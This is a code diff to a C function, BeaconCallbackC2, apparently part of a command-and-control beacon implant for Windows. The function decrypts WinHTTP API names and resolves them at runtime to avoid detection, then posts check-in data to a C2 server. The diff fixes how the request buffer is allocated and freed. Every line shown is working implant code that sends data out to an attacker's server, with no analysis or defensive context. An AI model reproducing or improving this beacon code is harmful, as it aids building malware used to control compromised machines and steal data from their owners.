@@ -415,15 +415,6 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     WinHttpReadData_ rWinHttpReadData = (WinHttpReadData_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
     free(tmp_decrypted_str);
 
-    // check if we doing a normal checkin or sending data
-
-    if (SendBuffer == NULL && SendOpCode == NULL)
-    {
-        UriBuffer = (LPCSTR*)malloc(5000);
-    } else {
-        UriBuffer = (LPCSTR*)malloc(SendBufferSize * 2);
-    }
-
     hSession = rWinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
     if (!hSession)
@@ -469,8 +460,6 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 
     // build the data for the request
 
-    memset(UriBuffer, '\0', strlen(UriBuffer));
-
     if (SendOpCode != NULL)
     {
         UriBuffer = BuildCheckinData(SendOpCode, SendBuffer, MODE_CHECKIN_DATA);
@@ -481,6 +470,7 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     // finally send the actual request to the c2
 
     bResults = rWinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
+    free(UriBuffer);
 
     // make sure the request was successful
 
